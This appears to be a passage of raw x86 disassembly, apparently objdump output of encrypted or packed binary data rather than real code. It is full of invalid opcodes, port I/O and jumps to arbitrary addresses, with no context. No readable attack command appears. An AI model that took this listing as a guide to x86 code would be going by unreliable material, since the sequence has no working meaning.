  413d1d:	xchg   esi,eax
  413d1e:	sub    DWORD PTR [eax],esi
  413d20:	fiadd  WORD PTR [edx]
  413d22:	cli    
  413d23:	pusha  
  413d24:	pop    ds
  413d25:	jle    0x413d03
  413d27:	popa   
  413d28:	xor    eax,0x66de4443
  413d2d:	in     eax,0xe4
  413d2f:	pop    es
  413d30:	aam    0x61
  413d32:	or     esi,esp
  413d34:	xchg   DWORD PTR [edx],esp
  413d36:	adc    al,BYTE PTR [eax+0x51525437]
  413d3c:	push   es
  413d3d:	outs   dx,BYTE PTR ds:[esi]
  413d3e:	pop    eax
  413d3f:	scas   eax,DWORD PTR es:[edi]
  413d40:	or     al,0xb3
  413d42:	repnz cmp DWORD PTR [eax+0x18],ebp
  413d46:	icebp  
  413d47:	mov    dl,0x2c
  413d49:	cmp    BYTE PTR [ecx-0x28e3bc77],dh
  413d4f:	xor    al,0x8a
  413d51:	or     al,0x46
  413d53:	fist   DWORD PTR [edx]
  413d55:	mov    edx,0x89e9fd2d
  413d5a:	inc    ebx
  413d5b:	mov    esi,0xbfe5020f
  413d60:	mov    al,ds:0x10de7fb5
  413d65:	out    0x72,al
  413d67:	xchg   esi,eax
  413d68:	fs cdq 
  413d6a:	arpl   WORD PTR [esi-0x25],dx
  413d6d:	jns    0x413dd6
  413d6f:	ret    
  413d70:	add    eax,esp
  413d72:	out    dx,eax
  413d73:	daa    
  413d74:	jbe    0x413dc3
  413d76:	into   
  413d77:	xor    eax,0xa4f414d4
  413d7c:	xchg   ebx,eax
  413d7d:	mov    bh,0x2f
  413d7f:	jecxz  0x413da1
  413d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d82:	jge    0x413db6
  413d84:	sub    BYTE PTR [esi],bh
  413d86:	call   0x9150:0x671851e1
  413d8d:	jo     0x413d2a
  413d8f:	adc    dl,BYTE PTR [esi+0x28]
  413d92:	cmp    eax,0x66a218e2
  413d97:	sbb    DWORD PTR [esi],0x9
  413d9a:	mov    dl,0x37
  413d9c:	push   edx
  413d9d:	jle    0x413d8c
  413d9f:	add    al,0x2b
  413da1:	mov    eax,0x2d5ed7af
  413da6:	popa   
  413da7:	mov    cl,0xae
  413da9:	mov    DWORD PTR [edx+0x56],ecx
  413dac:	fwait
  413dad:	int    0xd3
  413daf:	and    al,0xae
  413db1:	xchg   ebp,eax
  413db2:	scas   al,BYTE PTR es:[edi]
  413db3:	mul    DWORD PTR [di]
  413db6:	test   DWORD PTR [edx+0x347f90b5],eax
  413dbc:	retf   
  413dbd:	sbb    DWORD PTR [ecx-0x5e],ecx
  413dc0:	dec    esp
  413dc1:	(bad)  
  413dc2:	loopne 0x413d4b
  413dc4:	cmp    bh,BYTE PTR [edx-0x3a]
  413dc7:	scas   al,BYTE PTR es:[edi]
  413dc8:	xchg   ecx,eax
  413dc9:	or     esp,ecx
  413dcb:	push   edi
  413dcc:	and    BYTE PTR [edi+0xb],dh
  413dcf:	fdivp  st(7),st
  413dd1:	jbe    0x413e37
  413dd3:	ds xor ch,ah
  413dd6:	cli    
  413dd7:	jl     0x413dcb
  413dd9:	test   DWORD PTR [ebx+0x2c],esi
  413ddc:	and    eax,0x4473ef6f
  413de1:	pop    edi
  413de2:	pop    es
  413de3:	dec    ecx
  413de4:	repnz sbb ecx,DWORD PTR [ebp+ecx*2+0x7c]
  413de9:	lea    ebx,[ecx+0x7f0292a5]
  413def:	scas   al,BYTE PTR es:[edi]
  413df0:	sar    edi,1
  413df2:	(bad)  
  413df3:	popa   
  413df4:	sbb    ah,BYTE PTR [edi+0x2e]
  413df7:	sbb    BYTE PTR [esi+0x73867d19],dl
  413dfd:	cli    
  413dfe:	int    0x9c
  413e00:	mov    cl,0x30
  413e02:	xlat   BYTE PTR ds:[ebx]
  413e03:	retf   
  413e04:	loope  0x413e73
  413e06:	dec    edx
  413e07:	push   ebp
  413e08:	fisubr WORD PTR ds:0xc779d572
  413e0e:	icebp  
  413e0f:	lahf   
  413e10:	mov    ds:0xdf9af20f,al
  413e15:	mov    edi,0x25ce5170
  413e1a:	pop    esp
  413e1b:	xchg   edx,eax
  413e1c:	pop    ds
  413e1d:	dec    esp
  413e1e:	hlt    
  413e1f:	nop
  413e20:	(bad)  
  413e21:	sar    DWORD PTR [ebp+0xf],1
  413e24:	imul   edi,DWORD PTR [esp+eax*4-0x15],0x986a478a
  413e2c:	shl    BYTE PTR [esi-0x484530a],1
  413e32:	fimul  DWORD PTR [esi-0x4df4ab43]
  413e38:	jmp    0xb416:0x9e6fe177
  413e3f:	in     eax,0x3
  413e41:	lods   al,BYTE PTR ds:[esi]
  413e42:	sbb    al,0x16
  413e44:	ds (bad) 
  413e46:	lea    ebp,[ecx]
  413e48:	mov    ds:0x7a2f2ff2,eax
  413e4d:	jg     0x413e58
  413e4f:	xchg   BYTE PTR [edx+0x6316586b],dl
  413e55:	mov    al,ds:0xbf9cfce
  413e5a:	aas    
  413e5b:	and    DWORD PTR [ecx],esp
  413e5d:	fadd   DWORD PTR [ecx]
  413e5f:	and    al,0x76
  413e61:	dec    ebp
  413e62:	ds in  al,dx
  413e64:	mov    cl,0xb0
  413e66:	out    dx,eax
  413e67:	outs   dx,BYTE PTR ds:[esi]
  413e68:	fst    DWORD PTR [ecx-0xd]
  413e6b:	test   BYTE PTR [ecx+0x20],ch
  413e6e:	or     edx,DWORD PTR [esi]
  413e70:	int    0xdf
  413e72:	test   eax,0xfa707230
  413e77:	jbe    0x413e90
  413e79:	fdiv   QWORD PTR [esi+edi*1]
  413e7c:	pop    es
  413e7d:	(bad)  
  413e7e:	mov    ah,0x60
  413e80:	(bad)
  413e84:	nop
  413e85:	xchg   edi,eax
  413e86:	and    cl,dh
  413e88:	dec    esi
  413e89:	iret   
  413e8a:	je     0x413e7f
  413e8c:	add    esp,DWORD PTR [eax+0x5fe77ddc]
  413e92:	sti    
  413e93:	add    ch,ch
  413e95:	sahf   
  413e96:	pop    esp
  413e97:	cmp    esi,edi
  413e99:	fmul   DWORD PTR [ecx]
  413e9b:	cmp    DWORD PTR [ebp-0x16],ebp
  413e9e:	and    al,0x73
  413ea0:	fbstp  TBYTE PTR [edi]
  413ea2:	jo     0x413e47
  413ea4:	repnz and al,0xd9
  413ea7:	test   al,0x54
  413ea9:	mov    bl,0xcc
  413eab:	mov    eax,ds:0x51755d6e
  413eb0:	inc    ebx
  413eb1:	push   cs
  413eb2:	imul   BYTE PTR [eax]
  413eb4:	ds add eax,0xe682c3ae
  413eba:	mov    bl,0x4
  413ebc:	mov    ch,0x52
  413ebe:	es aam 0x22
  413ec1:	scas   al,BYTE PTR es:[edi]
  413ec2:	stc    
  413ec3:	xor    eax,0xc71eecb7
  413ec8:	xor    dh,dh
  413eca:	add    cl,BYTE PTR [ecx-0x78254fd8]
  413ed0:	sbb    al,0xbe
  413ed2:	arpl   WORD PTR [edi-0x24],ax
  413ed5:	xchg   ebx,eax
  413ed6:	xor    ebp,DWORD PTR [edi+ebx*4-0x30]
  413eda:	add    eax,DWORD PTR [edi-0xb03655f]
  413ee0:	clc    
  413ee1:	outs   dx,BYTE PTR ds:[esi]
  413ee2:	scas   al,BYTE PTR es:[edi]
  413ee3:	loop   0x413e72
  413ee5:	(bad)  
  413ee6:	push   ecx
  413ee7:	inc    edi
  413ee8:	rcr    DWORD PTR [edx+eiz*4-0x4b],0xcd
  413eed:	mov    bh,0x73
  413eef:	xchg   ebx,eax
  413ef0:	hlt    
  413ef1:	xor    DWORD PTR [ebx],eax
  413ef3:	jb     0x413e85
  413ef5:	int    0x16
  413ef7:	leave  
  413ef8:	aas    
  413ef9:	das    
  413efa:	push   DWORD PTR [edx+esi*1+0x39fafbff]
  413f01:	(bad)  
  413f02:	loop   0x413f1d
  413f04:	lock adc ebp,DWORD PTR [edi]
  413f07:	shr    DWORD PTR [edx],0x6
  413f0a:	push   eax
  413f0b:	lea    ebx,[edi]
  413f0d:	pop    ds
  413f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0f:	push   cs
  413f10:	or     al,0x77
  413f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f13:	sbb    ebx,DWORD PTR [edx-0x10]
  413f16:	push   ds
  413f17:	add    al,0x22
  413f19:	das    
  413f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f1b:	nop
  413f1c:	or     esp,DWORD PTR [edi+ecx*8]
  413f1f:	and    al,0x7d
  413f21:	dec    esi
  413f22:	and    edi,edi
  413f24:	jmp    DWORD PTR [ebp-0x2c527be5]
  413f2a:	push   esp
  413f2b:	add    DWORD PTR [edx],ebp
  413f2d:	lock enter 0xd331,0x72
  413f32:	cmp    BYTE PTR [eax-0x56776d4c],0xad
  413f39:	lods   al,BYTE PTR ds:[esi]
  413f3a:	cwde   
  413f3b:	(bad)  
  413f3c:	in     eax,dx
  413f3d:	dec    ecx
  413f3e:	push   ebp
  413f3f:	popa   
  413f40:	mul    dl
  413f42:	fs pop ebp
  413f44:	jne    0x413f0c
  413f46:	cmc    
  413f47:	test   DWORD PTR [edi-0x47],esi
  413f4a:	add    BYTE PTR [ecx+edx*4-0x8ab9d06],ah
  413f51:	lods   eax,DWORD PTR ds:[esi]
  413f52:	xchg   ebx,eax
  413f53:	and    DWORD PTR [ebp+0x258aa435],edi
  413f59:	jecxz  0x413fa8
  413f5b:	jmp    0x413f80
  413f5d:	ret    0x30e7
  413f60:	or     esp,edi
  413f62:	sbb    eax,DWORD PTR [esi+0x77]
  413f65:	push   eax
  413f66:	dec    esi
  413f67:	hlt    
  413f68:	mov    ah,0x66
  413f6a:	mov    ds:0xdb791b7d,al
  413f6f:	mov    esp,0xcdc129b3
  413f74:	push   0x85d387b8
  413f79:	in     eax,0x5e
  413f7b:	mov    WORD PTR [edi],cs
  413f7d:	aam    0x67
  413f7f:	pusha  
  413f80:	mov    dh,0xbc
  413f82:	fptan  
  413f84:	cmp    BYTE PTR [ecx+0x42df9498],ah
  413f8a:	xchg   esi,edx
  413f8c:	lods   eax,DWORD PTR ds:[esi]
  413f8d:	lods   al,BYTE PTR ds:[esi]
  413f8e:	loop   0x413f82
  413f90:	loop   0x413f86
  413f92:	pop    ds
  413f93:	mov    al,ds:0xe70474c6
  413f98:	cmp    ebp,0xa7c5357c
  413f9e:	dec    ebx
  413f9f:	idiv   dl
  413fa1:	std    
  413fa2:	repz mov ds:0xe5bb1264,eax
  413fa8:	mov    eax,ds:0x14598b63
  413fad:	pop    edx
  413fae:	or     bl,BYTE PTR [edi]
  413fb0:	leave  
  413fb1:	sti    
  413fb2:	ja     0x414011
  413fb4:	jb     0x41402b
  413fb6:	shl    BYTE PTR [ebp+0xa],1
  413fb9:	imul   esi,esp,0xffffffc2
  413fbc:	and    DWORD PTR [edx],esi
  413fbe:	push   ecx
  413fbf:	rol    ah,0xb1
  413fc2:	jg     0x413fcb
  413fc4:	cs xor al,0xb8
  413fc7:	test   BYTE PTR [eax-0x15],ch
  413fca:	not    esi
  413fcc:	or     eax,0xa403658a
  413fd1:	pop    ds
  413fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd3:	xor    al,dh
  413fd5:	ss mov edx,0xda66b00
  413fdb:	xchg   edx,eax
  413fdc:	leave  
  413fdd:	or     dh,BYTE PTR [edi]
  413fdf:	xchg   BYTE PTR [ebp-0x21],bh
  413fe2:	cwde   
  413fe3:	in     al,dx
  413fe4:	sti    
  413fe5:	rcl    BYTE PTR [ebp+edi*4-0x3f138fcc],0xa2
  413fed:	not    BYTE PTR [edx]
  413fef:	cs push cs
  413ff1:	aas    
  413ff2:	fild   DWORD PTR [edx+0x3d69ad1a]
  413ff8:	sbb    BYTE PTR [edx+edx*2+0x69],ah
  413ffc:	add    ecx,DWORD PTR [ecx+0x288de672]
  414002:	scas   eax,DWORD PTR es:[edi]
  414003:	add    eax,0x2f0070b6
  414008:	push   ecx
  414009:	pusha  
  41400a:	mov    bh,0x59
  41400c:	inc    ebx
  41400d:	or     cl,BYTE PTR [esi+0x3f7680a]
  414013:	lea    eax,[ebx+0x42]
  414016:	push   0xc5a43684
  41401b:	inc    esi
  41401c:	pop    eax
  41401d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41401f:	jl     0x41400b
  414021:	cmc    
  414022:	cli    
  414023:	pusha  
  414024:	sbb    ebp,ebp
  414026:	pop    ss
  414027:	jo     0x414032
  414029:	jmp    0x413fb2
  41402b:	jmp    0xd351:0xc690c233
  414032:	cld    
  414033:	daa    
  414034:	xor    DWORD PTR [ebx-0x5d],ebx
  414037:	adc    DWORD PTR [esi+ebp*2],esi
  41403a:	(bad)  
  41403b:	lds    esi,FWORD PTR [ecx+0x9]
  41403e:	xchg   esi,eax
  41403f:	das    
  414040:	shr    BYTE PTR [ebx+0x60cc243e],0x45
  414047:	shl    eax,cl
  414049:	shr    edx,0xed
  41404c:	push   ebp
  41404d:	jecxz  0x413ff7
  41404f:	mov    ds:0xb55cf836,al
  414054:	jg     0x414065
  414056:	jb     0x413fe9
  414058:	(bad)  
  414059:	lahf   
  41405a:	mov    edx,0x1b42f57c
  41405f:	je     0x4140b7
  414061:	arpl   WORD PTR [edi],bx
  414063:	pop    esi
  414064:	jnp    0x414053
  414066:	adc    esi,edi
  414068:	jecxz  0x4140c8
  41406a:	mov    ds:0x19df8d9f,eax
  41406f:	inc    eax
  414070:	cmp    eax,ecx
  414072:	or     eax,0x26289b0c
  414077:	out    0x63,eax
  414079:	sbb    ch,BYTE PTR [esi]
  41407b:	inc    edi
  41407c:	pop    ds
  41407d:	push   esi
  41407e:	sbb    al,0x41
  414080:	mov    ss,WORD PTR [ecx-0x27]
  414083:	cmp    al,0xb0
  414085:	lds    ecx,FWORD PTR [ecx-0x51]
  414088:	cmp    DWORD PTR [eax+0x1e],ebp
  41408b:	jo     0x414019
  41408d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41408e:	mov    dh,0x50
  414090:	into   
  414091:	test   DWORD PTR [edi-0x6cdf5daf],edi
  414097:	mov    edx,0x8895f83d
  41409c:	push   edx
  41409d:	add    cl,BYTE PTR [edi]
  41409f:	jnp    0x414064
  4140a1:	push   ecx
  4140a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140a3:	call   DWORD PTR [esi-0x157757c9]
  4140a9:	cmp    DWORD PTR [esi+0x132ed447],esi
  4140af:	cmp    eax,0xc31a8362
  4140b4:	or     BYTE PTR [esi],bh
  4140b6:	inc    esp
  4140b7:	xchg   DWORD PTR [edi],ebp
  4140b9:	dec    edx
  4140ba:	push   esi
  4140bb:	mov    ch,al
  4140bd:	daa    
  4140be:	jl     0x41413f
  4140c0:	fwait
  4140c1:	shr    DWORD PTR [ecx],0xa6
  4140c4:	rcr    DWORD PTR [ebp-0x79],0x89
  4140c8:	jp     0x4140a9
  4140ca:	out    0xa8,al
  4140cc:	or     DWORD PTR [ebx+ebp*1+0x2e],edi
  4140d0:	daa    
  4140d1:	shr    ebx,0x8b
  4140d4:	push   esp
  4140d5:	inc    esp
  4140d6:	mov    ebp,0x22af386
  4140db:	and    DWORD PTR gs:[eax-0x41],ecx
  4140df:	fdiv   DWORD PTR [ecx-0x1c]
  4140e2:	daa    
  4140e3:	shl    al,cl
  4140e5:	mov    bh,0xa0
  4140e7:	sub    esi,ecx
  4140e9:	push   ecx
  4140ea:	xor    ebp,DWORD PTR [eax]
  4140ec:	enter  0xda63,0x40
  4140f0:	pop    edi
  4140f1:	push   ecx
  4140f2:	out    0x71,al
  4140f4:	jno    0x41408b
  4140f6:	aas    
  4140f7:	sbb    ch,BYTE PTR [ebx+0x935e60]
  4140fd:	loop   0x4140e1
  4140ff:	sub    DWORD PTR [edi],0x47
  414102:	sub    esi,edi
  414104:	retf   
  414105:	and    eax,0x917f72b0
  41410a:	jmp    0x4140b8
  41410c:	hlt    
  41410d:	xchg   edi,eax
  41410e:	ret    
  41410f:	jb     0x4140b8
  414111:	sbb    ecx,DWORD PTR [ebx+0x77d578f1]
  414117:	das    
  414118:	int3   
  414119:	sub    al,0xca
  41411b:	cmp    dl,BYTE PTR [ebp-0x79eeaab9]
  414121:	iret   
  414122:	jb     0x4140ee
  414124:	mov    ebx,0x33f93714
  414129:	ret    
  41412a:	shl    DWORD PTR [esp+ebx*2+0x6b],cl
  41412e:	adc    ecx,DWORD PTR [edi]
  414130:	add    ch,BYTE PTR [ebx]
  414132:	aas    
  414133:	xchg   esp,eax
  414134:	cmp    al,0xa2
  414136:	push   edx
  414137:	out    dx,eax
  414138:	push   ds
  414139:	les    ecx,FWORD PTR [edx+0x45ed3fe5]
  41413f:	popa   
  414140:	add    eax,0xc0ffcad1
  414145:	push   edi
  414146:	push   0xbe057e5b
  41414b:	mov    ah,0x85
  41414d:	call   0x783f5c33
  414152:	xchg   ebx,eax
  414153:	sub    DWORD PTR [ebp+0x6de64559],ebp
  414159:	cmc    
  41415a:	test   eax,0x958c7db2
  41415f:	leave  
  414160:	xor    BYTE PTR [edx-0x34],dl
  414163:	and    BYTE PTR [ebx+0x36],dh
  414166:	shl    DWORD PTR [ecx-0x6b],cl
  414169:	adc    eax,0x1f7f080d
  41416e:	shr    DWORD PTR [esi],1
  414170:	rcpps  xmm5,xmm2
  414173:	lods   eax,DWORD PTR ds:[esi]
  414174:	add    esp,DWORD PTR [ecx-0x4ce93e0e]
  41417a:	gs jae 0x4141ae
  41417d:	sub    eax,0xb212ff24
  414182:	pop    ss
  414183:	mov    edx,0x5c6b95f4
  414188:	nop
  414189:	or     ch,ch
  41418b:	jne    0x414176
  41418d:	or     ebp,DWORD PTR [eax+edi*1+0x15a3ccce]
  414194:	xor    eax,0xabe8e0a5
  414199:	dec    edi
  41419a:	jmp    0xbd6fce36
  41419f:	data16 cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  4141a2:	pop    ds
  4141a3:	pop    eax
  4141a4:	jg     0x4141cd
  4141a6:	pop    edi
  4141a7:	(bad)  
  4141a8:	retf   
  4141a9:	stos   BYTE PTR es:[edi],al
  4141aa:	es jnp 0x4141c6
  4141ad:	pop    esp
  4141ae:	loop   0x41419c
  4141b0:	cs mov ebp,0x4ccc60d4
  4141b6:	and    edx,esp
  4141b8:	mov    eax,0x4a28e5ee
  4141bd:	jge    0x4141ce
  4141bf:	xchg   ecx,esi
  4141c1:	inc    ebp
  4141c2:	dec    esi
  4141c3:	pop    ebp
  4141c4:	push   ebx
  4141c5:	sar    DWORD PTR [edx+edi*2],0xb5
  4141c9:	dec    esi
  4141ca:	iret   
  4141cb:	call   0x8509:0xc597a3b7
  4141d2:	scas   al,BYTE PTR es:[edi]
  4141d3:	or     esi,esi
  4141d5:	mov    eax,0xd696d711
  4141da:	cmp    eax,0x197689b7
  4141df:	mov    dh,0xb1
  4141e1:	push   ds
  4141e2:	(bad)  
  4141e3:	dec    ebp
  4141e4:	jo     0x41421e
  4141e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e7:	jge    0x414252
  4141e9:	push   cs
  4141ea:	jecxz  0x414200
  4141ec:	sbb    eax,0x2a5a590a
  4141f1:	jo     0x414243
  4141f3:	loop   0x4141f0
  4141f5:	jle    0x4141f3
  4141f7:	lock cmp esp,DWORD PTR [ebp-0x6f]
  4141fb:	cmc    
  4141fc:	out    0xfd,eax
  4141fe:	sub    BYTE PTR [edx+0x271e08e5],0x48
  414205:	jb     0x4141b2
  414207:	push   eax
  414208:	inc    esi
  414209:	inc    ebx
  41420a:	jge    0x4141e5
  41420c:	mov    cl,0x60
  41420e:	iret   
  41420f:	test   al,0xd5
  414211:	inc    ebp
  414212:	and    BYTE PTR [ebx-0x57],0x37
  414216:	cmp    al,0xb5
  414218:	inc    eax
  414219:	push   esi
  41421a:	and    al,ah
  41421c:	xchg   ebp,eax
  41421d:	dec    ebp
  41421e:	bound  eax,QWORD PTR [edx+eiz*8+0x6ece1cd8]
  414225:	test   al,0x9f
  414227:	sub    DWORD PTR [ebx+edi*8-0x539bd1d5],ebx
  41422e:	add    al,ah
  414230:	pop    esp
  414231:	adc    eax,0xe979c7db
  414236:	mov    ah,0x2b
  414238:	test   al,0xd3
  41423a:	dec    edx
  41423b:	xchg   edx,eax
  41423c:	outs   dx,BYTE PTR ds:[esi]
  41423d:	adc    al,0xd8
  41423f:	jecxz  0x414211
  414241:	outs   dx,DWORD PTR ds:[esi]
  414242:	sbb    DWORD PTR [eax+0x31],edx
  414245:	ret    
  414246:	inc    edx
  414247:	imul   BYTE PTR [ebx]
  414249:	loop   0x414218
  41424b:	leave  
  41424c:	mov    cl,0xd6
  41424e:	adc    eax,0xab2a927a
  414253:	push   esi
  414254:	jecxz  0x41427c
  414256:	sbb    esp,ebp
  414258:	xchg   ebp,eax
  414259:	push   0xffffff8d
  41425b:	xchg   ebp,eax
  41425c:	inc    ebp
  41425d:	pop    ebp
  41425e:	popa   
  41425f:	enter  0xdde0,0xd2
  414263:	inc    esi
  414264:	lods   al,BYTE PTR ds:[esi]
  414265:	loope  0x4141fd
  414267:	loopne 0x414298
  414269:	add    BYTE PTR [eax],bh
  41426b:	ret    0xe625
  41426e:	or     eax,DWORD PTR [ebp+0x4a044b25]
  414274:	mov    ds:0xe1d0a553,eax
  414279:	(bad)  
  41427b:	jl     0x4142d1
  41427d:	ja     0x41425b
  41427f:	inc    edi
  414280:	pop    DWORD PTR [esi+0x6d1fada4]
  414286:	cdq    
  414287:	jmp    0xca477364
  41428c:	add    eax,0x726123b1
  414291:	cwde   
  414292:	mov    BYTE PTR [ecx+0x76],bl
  414295:	jmp    0x35948182
  41429a:	jae    0x4142db
  41429c:	out    dx,al
  41429d:	rcr    BYTE PTR [esi+0x70109169],1
  4142a3:	jg     0x414245
  4142a5:	sbb    edi,ecx
  4142a7:	or     BYTE PTR [eax-0x58d8ccd5],cl
  4142ad:	mov    cl,0xdb
  4142af:	jnp    0x414260
  4142b1:	retf   
  4142b2:	sbb    eax,0x490bedb4
  4142b7:	fstp   DWORD PTR [edi]
  4142b9:	loopne 0x4142df
  4142bb:	push   DWORD PTR [ebx]
  4142bd:	xor    esi,DWORD PTR [ecx-0x69]
  4142c0:	retf   0xcb47
  4142c3:	mov    edx,0xbc688a01
  4142c8:	fdivr  QWORD PTR [ecx-0x7e9329e8]
  4142ce:	retf   0x39cd
  4142d1:	mov    ch,0xce
  4142d3:	sti    
  4142d4:	mov    bh,0x6f
  4142d6:	jnp    0x41432c
  4142d8:	neg    DWORD PTR [ecx+ecx*2-0x26f7d57a]
  4142df:	je     0x41435d
  4142e1:	dec    edi
  4142e2:	sbb    al,0x3f
  4142e4:	sbb    edi,DWORD PTR [eax+0x33e4b212]
  4142ea:	repnz out 0x23,al
  4142ed:	stos   BYTE PTR es:[edi],al
  4142ee:	aad    0xa4
  4142f0:	mov    al,ds:0x7d09f570
  4142f5:	jg     0x4142c7
  4142f7:	imul   DWORD PTR [esi]
  4142f9:	cmp    ch,BYTE PTR [ebx]
  4142fb:	lds    edi,FWORD PTR [edi+esi*8+0x5150c61c]
  414302:	popa   
  414303:	adc    al,0xef
  414305:	lea    esp,ds:0x383ba525
  41430b:	ins    DWORD PTR es:[edi],dx
  41430c:	inc    eax
  41430d:	cmp    al,0x66
  41430f:	adc    BYTE PTR [ebx-0x80],bh
  414312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414313:	push   ds
  414314:	repnz mov al,ds:0x29065017
  41431a:	mov    eax,0xe796bd85
  41431f:	out    dx,al
  414320:	sub    bl,BYTE PTR [ecx+0x4d]
  414323:	adc    edi,DWORD PTR [edi+edi*1]
  414326:	xor    al,0xd2
  414328:	dec    edi
  414329:	xchg   ecx,eax
  41432a:	and    ebp,ebx
  41432c:	add    BYTE PTR [esi-0x14],bh
  41432f:	inc    ecx
  414330:	fwait
  414331:	mov    ds:0xde80634b,al
  414336:	inc    ecx
  414337:	or     BYTE PTR [esi-0x6],ah
  41433a:	cs cdq 
  41433c:	xor    esi,DWORD PTR [edx-0x1b2a75f5]
  414342:	xor    dh,cl
  414344:	aaa    
  414345:	mov    eax,0xa07310d
  41434a:	(bad)  
  41434b:	fwait
  41434c:	je     0x41433b
  41434e:	out    dx,al
  41434f:	dec    esi
  414350:	stos   BYTE PTR es:[edi],al
  414351:	fcomp  QWORD PTR [ebx-0x7b2d217]
  414357:	pushf  
  414358:	out    0xbd,al
  41435a:	sub    al,0x4
  41435c:	inc    ebp
  41435d:	hlt    
  41435e:	mov    esi,0x497fd5db
  414363:	mov    ecx,0xeb0cab4a
  414368:	sub    dl,BYTE PTR cs:[ebx-0x7c3795]
  41436f:	enter  0xa2bf,0xbe
  414373:	repz ror DWORD PTR [ecx-0x4b1c9a09],cl
  41437a:	cli    
  41437b:	pop    ecx
  41437c:	hlt    
  41437d:	in     eax,0xba
  41437f:	in     al,dx
  414380:	cmp    eax,0x844f80
  414386:	sbb    al,0x78
  414388:	mov    esp,0x159f96f5
  41438d:	enter  0x6a15,0x76
  414391:	sub    al,al
  414393:	cmp    al,0x80
  414395:	ret    
  414396:	adc    BYTE PTR [edi],al
  414398:	js     0x4143d5
  41439a:	mov    ds:0x44403fe4,eax
  41439f:	outs   dx,BYTE PTR ds:[esi]
  4143a0:	ins    BYTE PTR es:[edi],dx
  4143a1:	push   ecx
  4143a2:	cwde   
  4143a3:	data16 adc BYTE PTR [ecx+0x6a592eae],dh
  4143aa:	sbb    al,0x71
  4143ac:	retf   
  4143ad:	mov    al,0xe0
  4143af:	cld    
  4143b0:	mov    dl,BYTE PTR [ebp+0x49]
  4143b3:	in     eax,0x56
  4143b5:	cwde   
  4143b6:	out    0xa4,al
  4143b8:	xlat   BYTE PTR ds:[ebx]
  4143b9:	ret    
  4143ba:	add    BYTE PTR [eax+esi*2-0x53],al
  4143be:	xchg   edi,eax
  4143bf:	clc    
  4143c0:	shl    BYTE PTR [edi],cl
  4143c2:	mov    dh,0xd1
  4143c4:	ins    DWORD PTR es:[edi],dx
  4143c5:	cld    
  4143c6:	mov    bl,0x9c
  4143c8:	cmp    ecx,DWORD PTR [ebp+0x2dc27529]
  4143ce:	mov    edx,edx
  4143d0:	outs   dx,DWORD PTR ds:[esi]
  4143d1:	cdq    
  4143d2:	mov    esi,0xaada3497
  4143d7:	lock cmp eax,0xe95802b9
  4143dd:	enter  0x6e8d,0xe3
  4143e1:	add    DWORD PTR [esi],ebx
  4143e3:	push   eax
  4143e4:	rol    bl,0xbc
  4143e7:	aad    0xdc
  4143e9:	jbe    0x414402
  4143eb:	nop
  4143ec:	int    0x1f
  4143ee:	cmp    eax,0xff384328
  4143f3:	stos   DWORD PTR es:[edi],eax
  4143f4:	cmp    al,0xe3
  4143f6:	pusha  
  4143f7:	rcl    DWORD PTR [esi+0x37],1
  4143fa:	dec    ebp
  4143fb:	stc    
  4143fc:	fimul  WORD PTR [esi+0x63]
  414400:	xlat   BYTE PTR ds:[ebx]
  414401:	xchg   ebp,eax
  414402:	jmp    0xb96a290
  414407:	mov    bl,0xd7
  414409:	(bad)  
  41440a:	cmp    al,al
  41440c:	stos   BYTE PTR es:[edi],al
  41440d:	jbe    0x414435
  41440f:	push   cs
  414410:	js     0x414422
  414412:	mov    dh,0x0
  414414:	pop    es
  414415:	sub    eax,0xf1e74be6
  41441a:	sbb    al,0x33
  41441c:	lock fnstsw WORD PTR [edi-0x72]
  414420:	mov    DWORD PTR [eax+0x73],ecx
  414423:	cmp    edx,0xffffff9e
  414426:	ret    0x64d1
  414429:	and    esp,DWORD PTR [edx-0x3fe945d]
  41442f:	dec    ebx
  414430:	in     al,0x58
  414432:	push   ecx
  414433:	xchg   BYTE PTR [esp+esi*1+0x63384263],cl
  41443a:	adc    eax,0x3c430a8
  41443f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414440:	mov    ebp,0x13c62c74
  414445:	push   eax
  414446:	mov    dl,dh
  414448:	and    DWORD PTR [esi+0x62],0xffffff9f
  41444c:	ds push cs
  41444e:	nop
  41444f:	xchg   edx,eax
  414450:	ret    
  414451:	in     al,0xfd
  414453:	daa    
  414454:	ret    
  414455:	pop    esp
  414456:	push   edx
  414457:	out    dx,eax
  414458:	jne    0x414403
  41445a:	shl    BYTE PTR [eax-0x62],1
  41445d:	xor    DWORD PTR [esi+0x4a],esi
  414460:	daa    
  414461:	and    cl,cl
  414463:	loop   0x41447c
  414465:	pop    ds
  414466:	jne    0x41449d
  414468:	and    esp,DWORD PTR [ebx-0x62ca4e48]
  41446e:	mov    ch,0x7f
  414470:	ins    DWORD PTR es:[edi],dx
  414471:	jmp    DWORD PTR [esi-0x52a63128]
  414477:	push   ebx
  414478:	fdivr  DWORD PTR [ecx+ebx*1-0x54731d6c]
  41447f:	call   0x351a:0x91ce2455
  414486:	mov    dl,0x1
  414488:	pop    edi
  414489:	xchg   edx,eax
  41448a:	jns    0x41443a
  41448c:	jp     0x414470
  41448e:	push   ss
  41448f:	or     al,0x6
  414491:	dec    ecx
  414492:	add    DWORD PTR [ebp+ecx*2+0x38],edx
  414496:	xchg   DWORD PTR [eax+0x66],eax
  414499:	call   0x1ccff83d
  41449e:	scas   eax,DWORD PTR es:[edi]
  41449f:	out    dx,al
  4144a0:	xlat   BYTE PTR ds:[ebx]
  4144a1:	mov    DWORD PTR [ebp+0x1baf9766],esp
  4144a7:	add    bl,dh
  4144a9:	push   ss
  4144aa:	xor    DWORD PTR [esi-0x38],edx
  4144ad:	xchg   ebp,eax
  4144ae:	push   edx
  4144af:	pop    ds
  4144b0:	jnp    0x41443f
  4144b2:	popf   
  4144b3:	mov    ebp,0x793308fd
  4144b8:	cwde   
